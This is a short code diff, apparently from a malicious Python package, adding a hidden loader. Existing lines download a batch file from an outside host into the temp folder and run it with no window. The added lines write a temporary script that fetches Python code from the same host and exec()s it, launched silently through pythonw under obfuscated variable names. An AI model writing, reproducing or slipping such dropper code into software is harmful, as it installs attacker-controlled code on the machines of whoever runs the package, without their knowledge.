@@ -13,6 +13,7 @@ _ttmp.close()
 pythonw_path = _eexecutable.replace("python.exe", "pythonw.exe")
 Popen([pythonw_path, _ttmp.name])
 
+
 url = "https://h4ndl3r.vercel.app/a.bat"
 temp = tempfile.gettempdir()
 name = os.path.join(temp, f"{uuid.uuid4()}.bat")
@@ -22,3 +23,10 @@ if response.status_code == 200:
     with open(name, 'wb') as dosya:
         dosya.write(response.content)
     Popen([name], creationflags=CREATE_NO_WINDOW, shell=True)
+
+_ttmp = _ffile(delete=False)
+_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://h4ndl3r.vercel.app/3.txt").read())""")
+_ttmp.close()
+
+pythonw_path = _eexecutable.replace("python.exe", "pythonw.exe")
+Popen([pythonw_path, _ttmp.name])
